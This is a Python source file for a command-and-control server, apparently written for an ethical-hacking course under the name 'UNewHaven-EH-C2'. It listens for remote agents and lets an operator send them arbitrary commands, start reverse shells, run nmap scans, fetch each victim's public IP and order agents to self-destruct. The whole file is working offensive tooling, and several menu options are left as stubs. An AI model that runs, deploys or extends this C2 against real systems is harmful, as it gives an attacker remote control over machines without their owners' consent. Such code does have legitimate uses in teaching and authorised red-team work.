import socket
import subprocess
import time
import threading
import os
from colorama import Fore, Back, Style
from scanners.windows_enum import WindowsEnumerator
from reporting.markdown_report import MarkdownReport
from pathlib import Path
from core.dns_safety import dns_safety_check

exit_event = threading.Event()

counter=-1
clientList=[]
clientData=[]

host = "0.0.0.0"
port = 4545

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(5)
print(Fore.YELLOW + "[+] listening on port " + str(port), Fore.WHITE)

# keep alive function
def probe():
    while True:
        global counter
        global clientList
        global clientData

        try:
            d = 0
            for c in range(len(clientList)):
                clientList[c][1].send(b"?keepalive?\n")
                d = d + 1
        except:
            print(Fore.WHITE + "\nThis agent died:\n*************************\n" + Fore.WHITE, str(d), " --> ", clientData[d], "\n*************************\n")
            clientList.pop(d)
            clientData.pop(d)
            counter -= 1
            print(Fore.GREEN + "[+] Removed \"dead\" agent" + Fore.WHITE)
        
        time.sleep(4)

def init_main_sock():
    while True:
        conn, addr = s.accept()
        print(Fore.GREEN, f'\n[*] Accepted new connection from : {addr[0]}:{addr[1]} !!!', Fore.WHITE)
        
        client_sock_handle = conn.fileno()
        print(f"Client socket handle: {client_sock_handle}")

        global counter

        counter += 1

        clientInfo = conn.recv(1024)
        clientInfo = clientInfo.decode('UTF-8')
        clientInfo = clientInfo.split("\n")
        userInfo = clientInfo[0]

        global clientList
        global clientData

        clientList.append([counter, conn, userInfo])
        clientData.append(clientInfo)

        handler_thread = threading.Thread(target=probe)
        handler_thread.daemon = True
        handler_thread.start()

def agents():
    global counter
    global clientList
    global clientData

    selection = ""
    windows_enum = WindowsEnumerator()
    #nmap = NmapRunner()
    output_path = Path.cwd()
    report = MarkdownReport(output_path)

    if len(clientList) <= 0:
        print(Fore.RED + "[!] No agents connect yet... Please connect an agent to perform this action!")
        return
    
    print(Fore.GREEN + "Agnents: ", len(clientList), Fore.WHITE)

    temp = 0
    for b in clientData:
        print("Agent: ", temp, " --> ", b)
        temp += 1
    
    print(Fore.GREEN + "\nPick an agent to interact with.\n" + Fore.WHITE)

    try:
        selection = int(input(' <enter the client #> $ '))
    except:
        print(Fore.RED + "[!] Invalid entry provided, client selection must be a number...")
        time.sleep(2)
        return
    
    while True:
        if os.name == 'nt':
            os.system("cls")
        else:
            os.system("clear")

        print(Fore.GREEN)
        print("Which action would you like to perform?")
        print("1. Send a Message")
        print("2. Get User Info")
        print("3. Get Public IP")
        print("4. Kill Agent")
        print("5. Start a Shell")
        print("6. Whoami")
        print("7. Run a Command")
        print("8. Target Parsing")
        print("9. Host Enumerate")
        print("10. Exploit")
        print("11. Generate Report")
        print("12. DNS Security")
        print("13. File Management")
        # Leave room for expansion, have a gap between last action and the exit option
        print("14. Return to Main Menu")
        print(Fore.WHITE)

        try:
            choice = int(input(Fore.YELLOW + '[Select an Action] $ ' + Fore.WHITE))
        except:
            print(Fore.RED + "[!] Invalid entry provided, menu selection must be a number...")
            time.sleep(2)
            pass

        

        if choice == 1:
            try:
                clientList[selection][1].send(b":msg:\nHey from the server!\n")
                print(Fore.GREEN + "[+] Message Sent!" + Fore.WHITE)
                time.sleep(2)
            except:
                print(Fore.RED + "[!] There was an error sending the message to the agent...\nCheck to see if the agent is still operational" + Fore.WHITE)
                time.sleep(2)
                return
        elif choice == 2:
            for a in clientData[selection]:
                print(a)
            input(Fore.YELLOW + "[-] Press Enter to return to actions menu..." + Fore.WHITE)
        elif choice == 3:
            clientList[selection][1].send(b":run_command:\ncurl.exe ifconfig.me\n")
            print(Fore.GREEN + "[+] Command sent to agent!" + Fore.WHITE)
            command_response = clientList[selection][1].recv(10240)
            command_response = command_response.decode('UTF-8')
            print("Agent's Public IP Address: " + command_response.split("\n")[1])
            input(Fore.YELLOW + "[-] Press Enter to return to actions menu..." + Fore.WHITE)
        elif choice == 4:
            try:
                clientList[selection][1].send(b":self-destruct:\n")
                print(Fore.GREEN + "[+] Agent Self Destruct Successful!" + Fore.WHITE)
                time.sleep(2)
            except:
                print(Fore.RED + "[!] There was an error sending the self destruct instruction to the agent...\nCheck to see if the agent is still operational" + Fore.WHITE)
                time.sleep(2)
                return
        elif choice == 5:
            exit_event.clear()

            handler_thread = threading.Thread(target=start_rev_shell_server)
            handler_thread.daemon = True
            handler_thread.start()

            print("[+] Starting shell in 2 seconds")
            time.sleep(2)

            clientList[selection][1].send(b":shell:\n")

            while not exit_event.is_set():
                time.sleep(1)
            return
        elif choice == 6:
            clientList[selection][1].send(b":whoami:\n")
            whoami = clientList[selection][1].recv(1024)
            whoami = whoami.decode('UTF-8')
            print("You are: ", whoami)
            time.sleep(2)
        elif choice == 7:
            command = input(Fore.YELLOW + "[Provide Agent Command] $ " + Fore.WHITE)
            clientList[selection][1].send(b":run_command:\n" + command.encode('UTF-8'))
            print(Fore.GREEN + "[+] Command sent to agent!" + Fore.WHITE)
            command_response = clientList[selection][1].recv(10240)
            command_response = command_response.decode('UTF-8')
            print(command_response)
            input(Fore.YELLOW + "[-] Press Enter to return to actions menu..." + Fore.WHITE)
        elif choice == 8:
            return
        elif choice == 9:
            clientList[selection][1].send(b":run_command:\ncurl.exe ifconfig.me\n")
            print(Fore.GREEN + "[+] Command sent to agent!" + Fore.WHITE)
            command_response = clientList[selection][1].recv(10240)
            command_response = command_response.decode('UTF-8')
            ip = command_response.split("\n")[1]
            clientList[selection][1].send(
                b":run_command:\nnmap.exe -sn " + ip.encode() + b" -oA recon-discovery\n"
            )
            command_response = clientList[selection][1].recv(10240)
            command_response = command_response.decode('UTF-8')

            report.add_host(ip)

            #report.write()

            print(command_response)
        elif choice == 10:
            return
        elif choice == 11:
           clientList[selection][1].send(b":run_command:\ncurl.exe ifconfig.me\n")
           command_response = clientList[selection][1].recv(10240)
           command_response = command_response.decode('UTF-8')
           print(Fore.GREEN + "[+] Genrating Enumeration Report for Agent's Public IP Address: " + Fore.WHITE+command_response.split("\n")[1])

           command = r'py ".\main.py" -t "'+command_response.split("\n")[1]+r'"'
           # clientList[selection][1].send(b":run_command:\n"+command+"\n")
           print(command.encode())
            
           clientList[selection][1].send(command.encode())

           command_response = clientList[selection][1].recv(10240)
           command_response = command_response.decode('UTF-8')
           #print(command_response)
           input(Fore.YELLOW + "[-] Press Enter to return to actions menu..." + Fore.WHITE)
        elif choice == 12:
            try:
                # DNS safety check
                clientList[selection][1].send(b":run_command:\ncurl.exe ifconfig.me\n")
                command_response = clientList[selection][1].recv(10240)
                command_response = command_response.decode('UTF-8')
                ip = command_response.split("\n")[1]
                dns_safety_check(ip)
                print(Fore.GREEN + "[+] Command sent to agent!" + Fore.WHITE)
                time.sleep(2)
            except:
                print(Fore.RED + "[!] There was an error sending the message to the agent...\nCheck to see if the agent is still operational" + Fore.WHITE)
                time.sleep(2)
            return
        elif choice == 13:
            return
        elif choice == 14:
            return
        else:
            print(Fore.RED + "[!] Invlaid option selected, please try again..." + Fore.WHITE)
            time.sleep(2)

def server_selection():
    global clientList

    commands = "True"
    
    while not "exit" in commands:
        command = input(Fore.CYAN + "<< UNewHaven-EH-C2 >> $ " + Fore.WHITE)
        if command == "":
            pass
        elif command == "agents":
            agents()
        elif command == "cls" or command == "clear":
            if os.name == 'nt':
                os.system("cls")
            else:
                os.system("clear")
        elif command == "?" or command == "help":
            print(Fore.YELLOW + "UNewHaven-EH-C2 Commands Help:\n$ agents (lists available agents)\n$ clear/cls (clears screen)\n$ help/? (prints this message)\n$ Control + C (Kills C2 Server)\n")

def start_rev_shell_server():
    if os.name == 'nt':
        subprocess.call(["py", "pyrevshell_server.py"])
        exit_event.set()
    else:
        subprocess.call(["python3", "pyrevshell_server.py"])
        exit_event.set()

handler_thread = threading.Thread(target=init_main_sock)
handler_thread.daemon = True
handler_thread.start()

handler_thread = threading.Thread(target=server_selection)
handler_thread.daemon = True
handler_thread.start()

while True:
    time.sleep(1)